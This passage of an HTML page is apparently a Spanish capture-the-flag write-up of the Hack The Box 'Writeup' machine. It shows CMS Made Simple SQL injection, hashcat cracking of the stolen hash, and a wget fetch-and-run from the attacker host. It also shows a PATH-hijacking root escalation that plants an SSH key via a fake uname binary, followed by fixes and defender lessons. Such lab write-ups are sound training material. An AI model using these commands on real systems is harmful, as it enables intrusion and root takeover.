+            <span class="cmd-label">kali@kali — exploitation</span>
+          </div>
+          <div class="cmd-body"><span class="prompt">$ </span>python3 exploit.py <span class="flag-c">-u</span> http://10.129.19.66/writeup/ <span class="flag-c">--crack</span> <span class="flag-c">-w</span> /usr/share/wordlists/rockyou.txt</div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output — ~8 minutos de SQLi time-based</span></div>
+          <div class="output-body">[*] Salt: <span class="hl-green">5a599ef579066807</span>
+[+] Salt for password found: 5a599ef579066807
+
+[*] Username: <span class="hl-green">jkr</span>
+[+] Username found: jkr
+
+[*] Email: <span class="hl-green">jkr@writeup.htb</span>
+[+] Email found: jkr@writeup.htb
+
+[*] Password hash: <span class="hl-yellow">62def4866937f08cc13bab43bb14e6f7</span>
+[+] Password hash: 62def4866937f08cc13bab43bb14e6f7</div>
+        </div>
+        <div class="info-box interpret">
+          <strong>¿Qué obtuvimos?</strong> El hash es MD5 salteado en formato <code style="font-family:var(--font-mono)">md5(salt + password)</code>. Tenemos todos los ingredientes para crackearlo con hashcat.
+        </div>
+        <div class="info-box danger">
+          <strong>⚠ Nota:</strong> El --crack del exploit Python2/3 falla con UnicodeDecodeError en rockyou.txt. Usar hashcat directamente con modo 20.
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 6 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">06</span>
+        <span class="step-title">Cracking del hash — hashcat mode 20</span>
+      </div>
+      <div class="step-body">
+        <div class="info-box why">
+          <strong>¿Por qué modo 20?</strong> hashcat -m 20 corresponde al formato <code style="font-family:var(--font-mono)">md5($salt.$pass)</code> — exactamente cómo CMS Made Simple almacena contraseñas: calcula MD5 de la concatenación de salt + password.
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">kali@kali — password cracking</span>
+          </div>
+          <div class="cmd-body"><span class="prompt">$ </span>echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" > hash.txt
+<span class="prompt">$ </span>hashcat <span class="flag-c">-m 20</span> hash.txt /usr/share/wordlists/rockyou.txt <span class="flag-c">--force</span></div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output — 2 segundos (GPU)</span></div>
+          <div class="output-body">Status: <span class="hl-green">Cracked</span>
+Hash.Mode: 20 (md5($salt.$pass))
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:<span class="hl-green">raykayjay9</span>
+
+Time.Started: 2 secs | Speed: 1967.0 kH/s</div>
+        </div>
+        <div class="info-box interpret">
+          <strong>Credenciales obtenidas:</strong> <code style="font-family:var(--font-mono);color:var(--accent-green)">jkr : raykayjay9</code>. La contraseña estaba en rockyou.txt (rank ~4.3M). Crackeada en 2 segundos con GPU.
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 7 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">07</span>
+        <span class="step-title">Acceso SSH + User Flag</span>
+      </div>
+      <div class="step-body">
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">kali@kali → jkr@writeup</span>
+          </div>
+          <div class="cmd-body"><span class="prompt">$ </span>ssh jkr@10.129.19.66
+<span class="comment">  # Password: raykayjay9</span>
+<span class="prompt">jkr@writeup:~$ </span>id
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),<span class="hl-yellow">50(staff)</span>,103(netdev)
+<span class="prompt">jkr@writeup:~$ </span>cat ~/user.txt
+<span class="hl-green">47ae36242ac0ab41d76cae514e73374e</span></div>
+        </div>
+        <div class="info-box interpret">
+          <strong>¿Qué detectamos?</strong> El usuario <code style="font-family:var(--font-mono)">jkr</code> pertenece al grupo <strong style="color:var(--accent-yellow)">staff (GID 50)</strong>. En Debian, este grupo tiene permisos especiales sobre <code style="font-family:var(--font-mono)">/usr/local/sbin</code> y <code style="font-family:var(--font-mono)">/usr/local/bin</code>. Esta es la señal de alarma para el vector de privesc.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PRIVESC -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2 class="section-title">ESCALADA DE PRIVILEGIOS</h2>
+    </div>
+
+    <!-- Step 8 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">08</span>
+        <span class="step-title">Monitoreo de procesos — pspy64</span>
+      </div>
+      <div class="step-body">
+        <div class="info-box why">
+          <strong>¿Qué es pspy64?</strong> Herramienta que monitorea procesos Linux <strong>sin necesidad de root</strong>, usando inotify y lectura de /proc. Cuando el checklist básico (sudo -l, SUID, capabilities) no revela el vector, pspy descubre procesos periódicos o disparados por eventos.
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">jkr@writeup — process monitoring</span>
+          </div>
+          <div class="cmd-body"><span class="comment"># En Kali: servir pspy64</span>
+<span class="prompt">$ </span>python3 -m http.server 8888
+
+<span class="comment"># En la víctima:</span>
+<span class="prompt">jkr@writeup:/tmp$ </span>wget http://[LHOST]:8888/pspy64 && chmod +x pspy64 && ./pspy64</div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output — al hacer SSH login desde otra terminal</span></div>
+          <div class="output-body">CMD: <span class="hl-red">UID=0</span> PID=1769 | sh -c /usr/bin/env -i <span class="hl-yellow">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span> run-parts --lsbsysinit /etc/update-motd.d
+CMD: <span class="hl-red">UID=0</span> PID=1770 | run-parts --lsbsysinit /etc/update-motd.d
+CMD: <span class="hl-red">UID=0</span> PID=1771 | /bin/sh /etc/update-motd.d/10-uname</div>
+        </div>
+        <div class="info-box interpret">
+          <strong>¿Qué reveló?</strong> Cada vez que alguien se conecta por SSH, sshd ejecuta como <strong style="color:var(--accent-red)">UID=0 (root)</strong>:
+          <br><br>
+          <code style="font-family:var(--font-mono);font-size:0.77rem;color:var(--text-code)">PATH=/usr/local/sbin:... run-parts /etc/update-motd.d</code>
+          <br><br>
+          El script <code style="font-family:var(--font-mono)">10-uname</code> llama al comando <code style="font-family:var(--font-mono)">uname</code> sin ruta absoluta. El PATH busca primero en <code style="font-family:var(--font-mono)">/usr/local/sbin</code>. Si ese directorio es writable por jkr (a través del grupo staff), podemos inyectar un <code style="font-family:var(--font-mono)">uname</code> falso.
+        </div>
+        <div class="info-box decision">
+          <strong>Decisión:</strong> Verificar si /usr/local/sbin es writable por staff, luego crear /usr/local/sbin/uname malicioso.
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 9 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">09</span>
+        <span class="step-title">Verificación de permisos y PATH Hijacking</span>
+      </div>
+      <div class="step-body">
+        <div class="info-box why">
+          <strong>¿Qué es PATH Hijacking?</strong> Cuando un proceso privilegiado ejecuta un comando sin ruta absoluta (ej: <code style="font-family:var(--font-mono)">uname</code> en lugar de <code style="font-family:var(--font-mono)">/bin/uname</code>), el sistema busca en los directorios del PATH en orden. Si podemos colocar un binario malicioso en un directorio que aparece ANTES que el directorio legítimo, nuestro código se ejecuta con los privilegios del proceso padre.
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">jkr@writeup — privilege escalation</span>
+          </div>
+          <div class="cmd-body"><span class="comment"># Verificar que podemos escribir</span>
+<span class="prompt">jkr@writeup:~$ </span>ls -la /usr/local/ | grep sbin
+drwx<span class="hl-green">-wsr-x</span>  2 root <span class="hl-yellow">staff</span> 12288 Apr 19 2019 sbin
+
+<span class="comment"># Crear binario malicioso uname que inyecta nuestra SSH key en root</span>
+<span class="prompt">jkr@writeup:~$ </span>cat > /usr/local/sbin/uname &lt;&lt; 'EOF'
+#!/bin/bash
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAA...kali@kali" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+EOF
+<span class="prompt">jkr@writeup:~$ </span>chmod +x /usr/local/sbin/uname</div>
+        </div>
+        <div class="info-box interpret">
+          <strong>¿Qué hicimos?</strong> Creamos <code style="font-family:var(--font-mono)">/usr/local/sbin/uname</code> — un script bash que añade nuestra clave SSH pública al archivo <code style="font-family:var(--font-mono)">/root/.ssh/authorized_keys</code>. Cuando la próxima conexión SSH dispare update-motd, este script se ejecutará como root.
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 10 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">10</span>
+        <span class="step-title">Trigger + Root Flag</span>
+      </div>
+      <div class="step-body">
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">kali@kali — final trigger</span>
+          </div>
+          <div class="cmd-body"><span class="comment"># Conectar SSH para disparar el trigger (update-motd ejecuta nuestro uname)</span>
+<span class="prompt">$ </span>ssh jkr@10.129.19.66 'echo trigger'
+
+<span class="comment"># Conectar como root con la clave inyectada</span>
+<span class="prompt">$ </span>ssh <span class="flag-c">-i</span> ~/.ssh/id_rsa root@10.129.19.66 'id && cat /root/root.txt'</div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output — ROOT OBTENIDO</span></div>
+          <div class="output-body">uid=<span class="hl-green">0(root)</span> gid=0(root) groups=0(root)
+<span class="hl-green">b87af043e4c149ce29dc91a72dd5d34c</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DIAGRAMA -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2 class="section-title">DIAGRAMA DEL ATAQUE</h2>
+    </div>
+    <div class="diagram">
+<span class="d-dim">┌─────────────────────────────────────────────────────────────┐
+│                        ATACANTE                             │
+└──────────────────────────┬──────────────────────────────────┘
+                           │
+           <span class="d-blue">nmap -p- → puertos 22, 80</span>
+                           │
+           <span class="d-blue">robots.txt → /writeup/</span>
+                           │
+           <span class="d-yellow">CMS Made Simple 2.2.9.1 detectado</span>
+                           │
+           <span class="d-red">CVE-2019-9053 — SQLi time-based</span>
+           <span class="d-dim">└─► m1_idlist=...SLEEP(1)...</span>
+                           │
+           <span class="d-yellow">salt: 5a599ef579066807</span>
+           <span class="d-yellow">hash: 62def4866937f08cc13bab43bb14e6f7</span>
+                           │
+           <span class="d-red">hashcat -m 20 → raykayjay9</span>
+                           │
+           <span class="d-green">SSH jkr:raykayjay9</span>
+           <span class="d-green">→ USER FLAG ✓ 47ae36242ac0ab41d76cae514e73374e</span>
+                           │
+           <span class="d-yellow">id → grupo staff (GID 50)</span>
+           <span class="d-yellow">/usr/local/sbin writable por staff</span>
+                           │
+           <span class="d-red">PATH Hijacking:</span>
+           <span class="d-dim">└─► /usr/local/sbin/uname (malicioso)</span>
+           <span class="d-dim">└─► inyecta SSH key en /root/.ssh/authorized_keys</span>
+                           │
+           <span class="d-dim">Nueva conexión SSH → update-motd → script ejecuta como root</span>
+                           │
+           <span class="d-green">SSH root (clave inyectada)</span>
+           <span class="d-green">→ ROOT FLAG ✓ b87af043e4c149ce29dc91a72dd5d34c</span></span></div>
+  </div>
+
+  <!-- ANALISIS -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2 class="section-title">ANÁLISIS DE VULNERABILIDADES</h2>
+    </div>
+    <div class="vuln-card" style="margin-bottom:1rem">
+      <div class="vuln-header">
+        <span class="vuln-cve">CVE-2019-9053</span>
+        <span class="vuln-name">SQL Injection — CMS Made Simple</span>
+      </div>
+      <p class="vuln-desc"><strong style="color:var(--text-primary)">Causa raíz:</strong> El módulo News de CMSMS incluye el parámetro GET <code style="font-family:var(--font-mono)">m1_idlist</code> directamente en una consulta SQL sin sanitización ni prepared statements.</p>
+      <br>
+      <p class="vuln-desc"><strong style="color:var(--text-primary)">Fix correcto:</strong> Usar prepared statements y validar que el input solo contenga enteros separados por comas. Actualizar a CMS Made Simple ≥ 2.2.10.</p>
+      <br>
+      <p class="vuln-desc"><strong style="color:var(--text-primary)">Impacto en producción:</strong> Extracción de credenciales de admin → RCE → compromiso total del servidor web.</p>
+    </div>
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="vuln-cve">MISC</span>
+        <span class="vuln-name">PATH Hijacking — /usr/local/sbin writable por grupo staff</span>
+      </div>
+      <p class="vuln-desc"><strong style="color:var(--text-primary)">Causa raíz:</strong> El grupo <code style="font-family:var(--font-mono)">staff</code> en Debian tiene permisos de escritura en <code style="font-family:var(--font-mono)">/usr/local/sbin</code> por defecto. El script update-motd ejecutado por sshd como root usa comandos sin rutas absolutas, y el PATH incluye <code style="font-family:var(--font-mono)">/usr/local/sbin</code> primero.</p>
+      <br>
+      <p class="vuln-desc"><strong style="color:var(--text-primary)">Fix correcto:</strong> (1) Usar rutas absolutas en scripts ejecutados como root. (2) Remover permisos de escritura de staff en directorios del sistema: <code style="font-family:var(--font-mono)">chmod 755 /usr/local/sbin</code></p>
+    </div>
+  </div>
+
+  <!-- LECCIONES -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2 class="section-title">LECCIONES APRENDIDAS</h2>
+    </div>
+    <div class="lesson-grid">
+      <div class="lesson-card attacker">
+        <div class="lesson-card-title">// Para el atacante</div>
+        <ul class="lesson-list">
+          <li><strong>robots.txt primero</strong> — Leer antes de lanzar gobuster. Ahorra 10 minutos de fuzzing.</li>
+          <li><strong>Versión exacta importa</strong> — 2.2.9 vs 2.2.10: una versión de diferencia = SQLi crítica.</li>
+          <li><strong>fail2ban ≠ inmune a SQLi</strong> — Protege el formulario de login, no los parámetros GET de módulos.</li>
+          <li><strong>pspy64 cuando el checklist falla</strong> — Monitorear procesos al hacer SSH simultáneamente.</li>
+          <li><strong>Grupo staff = señal de alarma</strong> — Verificar inmediatamente /usr/local/sbin permisos.</li>
+          <li><strong>hashcat -m 20</strong> para md5(salt+pass) — No confiar en el --crack del exploit (encoding issues).</li>
+        </ul>
+      </div>
+      <div class="lesson-card defender">
+        <div class="lesson-card-title">// Para el defensor</div>
+        <ul class="lesson-list">
+          <li>Actualizar CMS Made Simple a versión ≥ 2.2.10 inmediatamente.</li>
+          <li>No exponer CHANGELOG.txt públicamente — revela la versión exacta.</li>
+          <li>Usar rutas absolutas en todos los scripts ejecutados como root.</li>
+          <li>Auditar permisos del grupo staff: <code style="font-family:var(--font-mono)">chmod 755 /usr/local/sbin</code></li>
+          <li>Monitorear creación de archivos en /usr/local/sbin con auditd.</li>
+          <li>Regla IDS: múltiples requests con SLEEP() en parámetros GET → SQLi.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- GLOSARIO -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">07</span>
+      <h2 class="section-title">GLOSARIO</h2>
+    </div>
+    <div class="glossary-grid">
+      <div class="glossary-item">
+        <div class="glossary-term">SQL Injection</div>
+        <div class="glossary-def">Vulnerabilidad donde input sin sanitizar se incluye en consultas SQL, permitiendo al atacante modificar la lógica de la base de datos.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">Time-Based Blind SQLi</div>
+        <div class="glossary-def">Variante de SQLi donde se infieren datos usando funciones de retardo (SLEEP). Si el servidor tarda = condición verdadera.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">MD5 Salteado</div>
+        <div class="glossary-def">Hash MD5 calculado sobre salt+password. El salt único hace que el mismo password produzca hashes distintos, dificultando ataques de diccionario simples.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">robots.txt</div>
+        <div class="glossary-def">Archivo que indica a bots qué no indexar. A menudo expone rutas "privadas" al atacante — el administrador lo crea creyendo que oculta contenido.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">PATH Hijacking</div>
+        <div class="glossary-def">Colocar un binario malicioso en un directorio que aparece antes en $PATH que el directorio legítimo. El proceso privilegiado ejecuta el malicioso primero.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">update-motd</div>
+        <div class="glossary-def">Sistema que genera el "Mensaje del Día" en SSH. Se ejecuta como root en cada conexión SSH, ejecutando scripts en /etc/update-motd.d/.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">pspy64</div>
+        <div class="glossary-def">Herramienta para monitorear procesos Linux sin privilegios root. Usa inotify + /proc para capturar procesos nuevos en tiempo real.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">fail2ban</div>
+        <div class="glossary-def">Software que bloquea IPs tras múltiples intentos fallidos. Protege formularios de login pero raramente los parámetros GET de aplicaciones.</div>
+      </div>
+      <div class="glossary-item">
+        <div class="glossary-term">hashcat -m 20</div>
+        <div class="glossary-def">Modo de hashcat para crackear hashes en formato md5($salt.$pass). Usa GPU para probar millones de contraseñas por segundo.</div>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <p>
+    <span>HEINDALL</span> — Offensive Security Portfolio &nbsp;·&nbsp;
+    Yoandy Ramírez Delgado &nbsp;·&nbsp;
+    HTB Writeup &nbsp;·&nbsp; 2026-04-11
+  </p>
+  <p style="margin-top:0.4rem">
+    <a href="#">← Volver al portfolio</a>
+  </p>
+</footer>
+
+</body>
+</html>
